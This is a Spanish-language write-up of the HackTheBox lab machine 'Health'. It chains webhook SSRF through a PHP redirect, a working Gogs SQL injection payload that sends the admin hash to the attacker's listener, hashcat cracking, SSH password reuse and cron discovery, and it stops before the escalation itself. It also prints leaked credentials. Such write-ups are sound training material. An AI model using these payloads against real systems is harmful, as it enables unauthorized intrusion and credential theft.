---
layout: post
title: Health
date: 2022-12-31
description: # You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. # Add post description (optional)
img: # /Blackfield-htb/Blackfield_thumbnail.jpg # Add image post (optional)
fig-caption: # Add figcaption (optional)
tags: [eWPT, eWPTXv2, OSWE, OSCP]
---
___

<center><img src="/writeups/assets/img/Health-htb/Health.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Abuso de WebHook

* Bypass de Restricciones

* Inyección SQL [CVE-2014-8682]

* Fuerza Bruta (Al romper hashes)

* SSRF + Inyección SQL

* Abuso de tarea CRON [Escalada de Privilegios]

***

# Reconocimiento

## Escaneo de puertos con nmap

### Puertos abiertos

```null
sudo nmap -p- --open --min-rate 5000 -n -Pn 10.10.11.176 -sS -vvv
[sudo] password for rubbx: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 17:29 GMT
Initiating SYN Stealth Scan at 17:29
Scanning 10.10.11.176 [65535 ports]
Discovered open port 80/tcp on 10.10.11.176
Discovered open port 22/tcp on 10.10.11.176
Completed SYN Stealth Scan at 17:29, 11.88s elapsed (65535 total ports)
Nmap scan report for 10.10.11.176
Host is up, received user-set (0.14s latency).
Scanned at 2023-01-09 17:29:10 GMT for 12s
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds
           Raw packets sent: 66629 (2.932MB) | Rcvd: 66627 (2.665MB)
```

### Servicios y versiones

```null
nmap -sCV -p22,80 10.10.11.176 -oN -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 17:30 GMT
Nmap scan report for 10.10.11.176
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32b7f4d42f45d330ee123b0367bbe631 (RSA)
|   256 86e15d8c2939acd7e815e649e235ed0c (ECDSA)
|_  256 ef6bad64d5e45b3e667949f4ec4c239f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.43 seconds
```

## Puerto 80 (http)

### Tecnologías empleadas

```null
whatweb http://10.10.11.176
http://10.10.11.176 [200 OK] Apache[2.4.29], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], Email[contact@health.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.176], Laravel, Script[text/js], Title[HTTP Monitoring Tool], X-UA-Compatible[ie=edge]
```

### Virtual Hosting

Se puede ver un dominio en el reporte de whatweb

```null
cat /etc/hosts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # LOCAL
   2   │ 
   3   │ 127.0.0.1 localhost kali
   4   │ ::1 ip6-localhost ip6-loopback
   5   │ 
   6   │ # HTB
   7   │ 
   8   │ 10.10.11.176  health.htb
```

### Página Web

El Sitio Web ofrece el siguiente formulario:

<img src="/writeups/assets/img/Health-htb/1.png" alt="">

A modo de traza, me pongo en escucha por dos puertos y relleno el formulario, para ver la data que se tramita

<img src="/writeups/assets/img/Health-htb/2.png" alt="">

<img src="/writeups/assets/img/Health-htb/3.png" alt="">


Montando un servidor web real con python se puede apreciar en la petición por POST que se refleja el contenido del index.html

```null
nc -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.176.
Ncat: Connection from 10.10.11.176:42238.
POST / HTTP/1.1
Host: 10.10.16.34
Accept: */*
Content-type: application/json
Content-Length: 335

{"webhookUrl":"http:\/\/10.10.16.34:80","monitoredUrl":"http:\/\/10.10.16.34:8080","health":"up","body":"Testing\n","message":"HTTP\/1.0 200 OK","headers":{"Server":"SimpleHTTP\/0.6 Python\/3.10.9","Date":"Tue, 10 Jan 2023 13:51:55 GMT","Content-type":"text\/html","Content-Length":"8","Last-Modified":"Mon, 09 Jan 2023 17:46:21 GMT"}}

```

Esto puede parecer que no lleva a ningún sitio pero en caso de que occura lo mismo con un fichero en PHP se puede dar un SSTI, con el que se pueden enumerar puertos internos abiertos así como abusar de sus servicios.

Nmap puede llegar a reportar puertos a los que no tienes acceso, pero que es probable que estén abiertos.

```null
nmap -p- --min-rate 5000 -n -Pn 10.10.11.176 -vvv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 17:49 GMT
Initiating Connect Scan at 17:49
Scanning 10.10.11.176 [65535 ports]
Discovered open port 80/tcp on 10.10.11.176
Discovered open port 22/tcp on 10.10.11.176
Completed Connect Scan at 17:49, 12.27s elapsed (65535 total ports)
Nmap scan report for 10.10.11.176
Host is up, received user-set (0.060s latency).
Scanned at 2023-01-09 17:49:42 GMT for 12s
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       REASON
22/tcp    open     ssh           syn-ack
80/tcp    open     http          syn-ack
3000/tcp  filtered ppp           no-response
4114/tcp  filtered jomamqmonitor no-response
54256/tcp filtered unknown       no-response

```

En PHP existe una manera de forzar un redirect en caso de ser interpretado:

```null
<?php
   head("Location: http://127.0.0.1:3000");
?>
```

Efectivamente, el servidor devuelve el siguiente contenido:

```null
nc -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.176.
Ncat: Connection from 10.10.11.176:36808.
POST / HTTP/1.1
Host: 10.10.16.34
Accept: */*
Content-type: application/json
Content-Length: 7741
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.16.34:80","monitoredUrl":"http:\/\/10.10.16.34:8080","health":"up","body":"<!DOCTYPE html>\n<html>\n\t<head data-suburl=\"\">\n\t\t<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/>\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\/>\n        <meta name=\"author\" content=\"Gogs - Go Git Service\" \/>\n\t\t<meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/>\n\t\t<meta name=\"keywords\" content=\"go, git, self-hosted, gogs\">\n\t\t<meta name=\"_csrf\" content=\"PqogcO-k8OK1tng5xfQZB-R8I5Q6MTY3MzM1OTQxNTkxODc1ODY3OQ==\" \/>\n\t\t\n\n\t\t<link rel=\"shortcut icon\" href=\"\/img\/favicon.png\" \/>\n\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.2.0\/css\/font-awesome.min.css\">\n\n\t\t<script src=\"\/\/code.jquery.com\/jquery-1.11.1.min.js\"><\/script>\n\t\t\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/ui.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/gogs.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/tipsy.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/magnific-popup.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/fonts\/octicons.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/css\/github.min.css\">\n\n\t\t\n    \t<script src=\"\/ng\/js\/lib\/lib.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.tipsy.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.magnific-popup.min.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/tabs.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/preview.js\"><\/script>\n\t\t<script src=\"\/ng\/js\/gogs.js\"><\/script>\n\n\t\t<title>Gogs: Go Git Service<\/title>\n\t<\/head>\n\t<body>\n\t\t<div id=\"wrapper\">\n\t\t<noscript>Please enable JavaScript in your browser!<\/noscript>\n\n<header id=\"header\">\n    <ul class=\"menu menu-line container\" id=\"header-nav\">\n        \n\n        \n            \n            <li class=\"right\" id=\"header-nav-help\">\n                <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\"><i class=\"octicon octicon-info\"><\/i>&nbsp;&nbsp;Help<\/a>\n            <\/li>\n            <li class=\"right\" id=\"header-nav-explore\">\n                <a href=\"\/explore\"><i class=\"octicon octicon-globe\"><\/i>&nbsp;&nbsp;Explore<\/a>\n            <\/li>\n            \n        \n    <\/ul>\n<\/header>\n<div id=\"promo-wrapper\">\n    <div class=\"container clear\">\n        <div id=\"promo-logo\" class=\"left\">\n            <img src=\"\/img\/gogs-lg.png\" alt=\"logo\" \/>\n        <\/div>\n        <div id=\"promo-content\">\n            <h1>Gogs<\/h1>\n            <h2>A painless self-hosted Git service written in Go<\/h2>\n            <form id=\"promo-form\" action=\"\/user\/login\" method=\"post\">\n                <input type=\"hidden\" name=\"_csrf\" value=\"PqogcO-k8OK1tng5xfQZB-R8I5Q6MTY3MzM1OTQxNTkxODc1ODY3OQ==\">\n                <input class=\"ipt ipt-large\" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-mail\"\/>\n                <input class=\"ipt ipt-large\" name=\"password\" type=\"password\" placeholder=\"Password\"\/>\n                <input name=\"from\" type=\"hidden\" value=\"home\">\n                <button class=\"btn btn-black btn-large\">Sign In<\/button>\n                <button class=\"btn btn-green btn-large\" id=\"register-button\">Register<\/button>\n            <\/form>\n            <div id=\"promo-social\" class=\"social-buttons\">\n                \n\n\n\n            <\/div>\n        <\/div>&nbsp;\n    <\/div>\n<\/div>\n<div id=\"feature-wrapper\">\n    <div class=\"container clear\">\n        \n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-flame\"><\/i>\n            <b>Easy to install<\/b>\n            <p>Simply <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_binary.html\">run the binary<\/a> for your platform. Or ship Gogs with <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/tree\/master\/dockerfiles\">Docker<\/a> or <a target=\"_blank\" href=\"https:\/\/github.com\/geerlingguy\/ansible-vagrant-examples\/tree\/master\/gogs\">Vagrant<\/a>, or get it <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_packages.html\">packaged<\/a>.<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-device-desktop\"><\/i>\n            <b>Cross-platform<\/b>\n            <p>Gogs runs anywhere <a target=\"_blank\" href=\"http:\/\/golang.org\/\">Go<\/a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-rocket\"><\/i>\n            <b>Lightweight<\/b>\n            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-code\"><\/i>\n            <b>Open Source<\/b>\n            <p>It's all on <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/\">GitHub<\/a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!<\/p>\n        <\/div>\n        \n    <\/div>\n<\/div>\n\t\t<\/div>\n\t\t<footer id=\"footer\">\n\t\t    <div class=\"container clear\">\n\t\t        <p class=\"left\" id=\"footer-rights\">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: <strong>1ms<\/strong> \u00b7\n\t\t            Template: <strong>1ms<\/strong><\/p>\n\n\t\t        <div class=\"right\" id=\"footer-links\">\n\t\t            <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\"><i class=\"fa fa-github-square\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/twitter.com\/gogitservice\"><i class=\"fa fa-twitter\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/plus.google.com\/communities\/115599856376145964459\"><i class=\"fa fa-google-plus\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"http:\/\/weibo.com\/gogschina\"><i class=\"fa fa-weibo\"><\/i><\/a>\n\t\t            <div id=\"footer-lang\" class=\"inline drop drop-top\">Language\n\t\t                <div class=\"drop-down\">\n\t\t                    <ul class=\"menu menu-vertical switching-list\">\n\t\t                    \t\n\t\t                        <li><a href=\"#\">English<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-CN\">\u7b80\u4f53\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-HK\">\u7e41\u9ad4\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=de-DE\">Deutsch<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=fr-CA\">Fran\u00e7ais<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=nl-NL\">Nederlands<\/a><\/li>\n\t\t                        \n\t\t                    <\/ul>\n\t\t                <\/div>\n\t\t            <\/div>\n\t\t            <a target=\"_blank\" href=\"http:\/\/gogs.io\">Website<\/a>\n\t\t            <span class=\"version\">Go1.3.2<\/span>\n\t\t        <\/div>\n\t\t    <\/div>\n\t\t<\/footer>\n\t<\/body>\n<\/html>","message":"HTTP\/1.0 302 Found","headers":{"Host":"10.10.16.34:8080","Date":"Tue, 10 Jan 2023 14:03:35 GMT","Connection":"close","X-Powered-By":"PHP\/8.1.12","Location":"http:\/\/127.0.0.1:3000","Content-type":"text\/html; charset=UTF-8","Content-Type":"text\/html; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}
```
Metiendo el contenido en un archivo temporal y conviertiendo los saltos de línea y tabulados desde el navegador web se puede ver el contenido:

```null
cat data | jq .body -r > index.html
python3 -m http.server 80
```


<img src="/writeups/assets/img/Health-htb/4.png" alt="">


El servicio es GoGits, con una versión 0.5.5

Buscando vulnerabilidades en exploit-db aparace lo siguiente:

```null
searchsploit gogs
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gogs - 'label' SQL Injection                                                                                                                                                   | multiple/webapps/35237.txt
Gogs - 'users'/'repos' '?q' SQL Injection                                                                                                                                      | multiple/webapps/35238.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Examinando el segundo recurso se puede ver una Prueba de Concepto con una inyección SQL

```null
searchsploit -x multiple/webapps/35238.txt

Proof of Concept
================
Request:
http://www.example.com/api/v1/repos/search?q=%27)%09UNION%09SELECT%09*%09FROM%09
(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09
user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)
%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09
as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as
%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09
a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09
JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN
%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN
%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN
%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN
%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN
%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27

Response:
{"data":[{"repolink":"bluec0re/test"},{"repolink":"bluec0re/secret"},{"repolink"
:"bluec0re/root@localhost"}],"ok":true}

```

Para una mayor comodidad, es preferible montar el Servicio Gogs en local, hacer las pruebas pertinentes y posteriormente emitir el payload final a la máquina victima

```null
wget https://github.com/gogs/gogs/releases/download/v0.5.5/linux_amd64.zip
unzip linux_amd64.zip
cd gogs
./gogs web
```

Una vez registrado, se puede ir a la ruta que contempla exploit-db donde se efectúa la SQLi

Devuelve "true", por tanto es buena señal

<img src="/writeups/assets/img/Health-htb/5.png" alt="">

Envíando al Repeater de BurpSuite:

<img src="/writeups/assets/img/Health-htb/6.png" alt="">

Más que la ruta de repos, sería más interesante tratar de enumerar la de usuarios. En el exploit ponía que la vulnerabilidad se acontecía porque la sanitización que utiliza consistía en que no interpreta los espacios, aunque estén en url-encode. Por tanto, hay que utilizar una alternativa que consiste en ponerlos con `/**/`

## Inyección SQL

Enumeración de columnas:

<img src="/writeups/assets/img/Health-htb/7.png" alt="">

Se leakea que hay 27 columnas. Por tanto con Union Select, voy a tratar de dumpear datos a través del error.

Se puede apreciar que el tercer campo es vulnerable

<img src="/writeups/assets/img/Health-htb/8.png" alt="">

Para una mayor rapidez, se puede ver que columnas existen desde el propio archivo de configuración que está en el equipo local

El archivo de configuración de la base de datos es el siguiente:

```null
find . | grep db
./gogs/data/gogs.db
```

Los campos más importantes son email,passwd,salt

El salt es necesario para poder crackear la contraseña, además del número de iteraciones

Utilizando una Nested Query, puedo traer tres campos al mismo tiempo.

<img src="/writeups/assets/img/Health-htb/9.png" alt="">

Una vez teniendo el hash y el salt, hay que adaptarlo para que el hashcat lo admita.

En el repositorio de Gogs, se puede encontrar el tipo de hash que se emplea, concretamente en el archivo users.go

```go
// EncodePasswd encodes password to safe format.
func (u *User) EncodePasswd() {
	newPasswd := base.PBKDF2([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)
	u.Passwd = fmt.Sprintf("%x", newPasswd)
```

Por tanto el encoder usado es PBKDF2 y el número de iteraciones es 10000

Con hashcat se puede filtrar por ese tipo de hash

```null
hashcat --example-hashes | grep -i PBKDF2 | grep Name
Name................: WPA-EAPOL-PBKDF2
Name................: macOS v10.8+ (PBKDF2-SHA512)
Name................: Cisco-IOS $8$ (PBKDF2-SHA256)
Name................: Django (PBKDF2-SHA256)
Name................: PBKDF2-HMAC-SHA256
Name................: RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)
Name................: PBKDF2-HMAC-MD5
Name................: PBKDF2-HMAC-SHA1
Name................: Atlassian (PBKDF2-HMAC-SHA1)
Name................: PBKDF2-HMAC-SHA512
Name................: MS-AzureSync PBKDF2-HMAC-SHA256
Name................: Ethereum Wallet, PBKDF2-HMAC-SHA256
Name................: Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256
Name................: WPA-PMKID-PBKDF2
Name................: Python passlib pbkdf2-sha512
Name................: Python passlib pbkdf2-sha256
Name................: Python passlib pbkdf2-sha1
Name................: Web2py pbkdf2-sha512
Name................: WPA-PBKDF2-PMKID+EAPOL
Name................: Telegram Desktop < v2.1.14 (PBKDF2-HMAC-SHA1)
Name................: XMPP SCRAM PBKDF2-SHA1
Name................: PKCS#8 Private Keys (PBKDF2-HMAC-SHA1 + 3DES/AES)
Name................: PKCS#8 Private Keys (PBKDF2-HMAC-SHA256 + 3DES/AES)
Name................: Telegram Desktop >= v2.1.14 (PBKDF2-HMAC-SHA512)
Name................: VMware VMX (PBKDF2-HMAC-SHA1 + AES-256-CBC)
Name................: VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)
Name................: VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)
Name................: Terra Station Wallet (AES256-CBC(PBKDF2($pass)))
```

De todos los que aparecen, el más probable es PBKDF2-HMAC-SHA256

Filtrando por ese hash:

```null
hashcat --example-hashes | grep ": PBKDF2-HMAC-SHA256" -C 10
  Example.Hash........: 48e61d68e93027fae35d405ed16cd01b6f1ae66267833b4a7aa1759e45bab9bba652da2e4c07c155a3d8cf1d81f3a7e8
  Example.Pass........: hashcat
  Benchmark.Mask......: ?b?b?b?b?b?b?b
  Autodetect.Enabled..: Yes
  Self.Test.Enabled...: Yes
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX

Hash mode #10900
  Name................: PBKDF2-HMAC-SHA256
  Category............: Generic KDF
  Slow.Hash...........: Yes
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure
  Example.Hash.Format.: plain
  Example.Hash........: sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk

```

Para poderlo crackear, el hash tiene que tener la siguiente estructura:

```null
sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk
```
A diferencia del hash que ya tengo:

```null
rubbx@rubbx.htb:ALG2ZQ7z0D:9d035503308ce61467a4e9fdeef43d183d90ee431d45c5a1ad613181bb3b82f7d3e060d1338b98b9429961ee73f714a847bc
```

Hay que convertir la cadena que está en hexadecimal a base64 y lo mismo para el salt, así como cambiar el número de iteraciones

Una vez entendido el proceso en local, toca retomar el SSTI del principio para obtener el hash real y obtener unas credenciales

# Explotación

```null
<?php
   head("Location: http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,(select/**/email||':'||salt||':'||passwd/**/from/**/user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/- ");
?>
```
Así que con netcat me pongo en escucha por un puerto y recibo la data

```null
nc -nlvp 8000
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.10.11.176.
Ncat: Connection from 10.10.11.176:39868.
POST / HTTP/1.1
Host: 10.10.16.34:8000
Accept: */*
Content-type: application/json
Content-Length: 983

{"webhookUrl":"http:\/\/10.10.16.34:8000","monitoredUrl":"http:\/\/10.10.16.34","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"admin@gogs.local:sO3XIbeW14:66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/15\"}],\"ok\":true}","message":"HTTP\/1.0 302 Found","headers":{"Host":"10.10.16.34","Date":"Tue, 10 Jan 2023 15:28:11 GMT","Connection":"close","X-Powered-By":"PHP\/8.1.12","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,2,(select\/**\/email||':'||salt||':'||passwd\/**\/from\/**\/user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--\/**\/-","Content-type":"text\/html; charset=UTF-8","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"293"}}
```

Adaptando el hash de admin obtenido al formato adecuado:

```null
sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```

Rompiéndolo con hashcat

```null
hashcat hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 3498/7060 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c


sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9u...9O/jc=
Time.Started.....: Tue Jan 10 15:40:38 2023 (16 secs)
Time.Estimated...: Tue Jan 10 15:40:54 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     4359 H/s (1.35ms) @ Accel:512 Loops:32 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 71680/14344385 (0.50%)
Rejected.........: 0/71680 (0.00%)
Restore.Point....: 69632/14344385 (0.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9984-9999
Candidate.Engine.: Device Generator
Candidates.#1....: 030979 -> 280282
Hardware.Mon.#1..: Util: 88%

Started: Tue Jan 10 15:40:00 2023
Stopped: Tue Jan 10 15:40:55 2023
```

Por tanto la contraseña es `february15`

Esta misma se reutiliza por ssh para el usuario sussane

```null
ssh susanne@health.htb
susanne@health.htb's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jan 10 15:44:07 UTC 2023

  System load:  0.01              Processes:           177
  Usage of /:   67.0% of 3.84GB   Users logged in:     0
  Memory usage: 14%               IP address for eth0: 10.10.11.176
  Swap usage:   0%

```

# Escalada

Buscando por archivos en el servidor web:

```null
susanne@health:/var/www/html$ ls -la
total 412
drwxr-xr-x  14 www-data www-data   4096 Jul 26 10:12 .
drwxr-xr-x   3 www-data www-data   4096 May 17  2022 ..
drwxrwxr-x   9 www-data www-data   4096 Jul 26 10:12 app
-rwxr-xr-x   1 www-data www-data   1686 May 17  2022 artisan
drwxrwxr-x   3 www-data www-data   4096 Jul 26 10:12 bootstrap
-rw-r--r--   1 www-data www-data   1775 May 17  2022 composer.json
-rw-r--r--   1 www-data www-data 292429 May 17  2022 composer.lock
drwxrwxr-x   2 www-data www-data   4096 May 17  2022 config
drwxrwxr-x   5 www-data www-data   4096 May 17  2022 database
-rw-r--r--   1 www-data www-data    258 May 17  2022 .editorconfig
-rw-r--r--   1 www-data www-data    978 May 17  2022 .env
-rw-r--r--   1 www-data www-data    899 May 17  2022 .env.example
drwxrwxr-x   8 www-data www-data   4096 Jul 26 10:12 .git
-rw-r--r--   1 www-data www-data    152 May 17  2022 .gitattributes
-rw-r--r--   1 www-data www-data    207 May 17  2022 .gitignore
drwxrwxr-x 507 www-data www-data  20480 Jul 26 10:12 node_modules
-rw-r--r--   1 www-data www-data    643 May 17  2022 package.json
-rw-r--r--   1 www-data www-data   1202 May 17  2022 phpunit.xml
drwxrwxr-x   4 www-data www-data   4096 Jul 26 10:12 public
-rw-r--r--   1 www-data www-data   3958 May 17  2022 README.md
drwxrwxr-x   7 www-data www-data   4096 Jul 26 10:12 resources
drwxrwxr-x   2 www-data www-data   4096 May 17  2022 routes
-rw-r--r--   1 www-data www-data    569 May 17  2022 server.php
drwxrwxr-x   5 www-data www-data   4096 May 17  2022 storage
-rw-r--r--   1 www-data www-data    194 May 17  2022 .styleci.yml
drwxrwxr-x   4 www-data www-data   4096 May 17  2022 tests
drwxrwxr-x  44 www-data www-data   4096 Jul 26 10:12 vendor
-rw-r--r--   1 www-data www-data    556 May 17  2022 webpack.mix.js
```

Se puede ver un archivo .env que contiene variables de entorno.
Se filtra la contraseña de la base de datos

```null
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
```

En la base de datos no hay nada de interés

Con PsPy detecto una tarea CRON ejecutada por root:

```null
CMD: UID=0    PID=13265  | /usr/sbin/CRON -f 
CMD: UID=0    PID=13269  | 
CMD: UID=0    PID=13270  | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
CMD: UID=0    PID=13273  | grep columns 
CMD: UID=0    PID=13271  | sh -c stty -a | grep columns 
CMD: UID=0    PID=13274  | sh -c stty -a | grep columns 
CMD: UID=0    PID=13276  | grep columns 
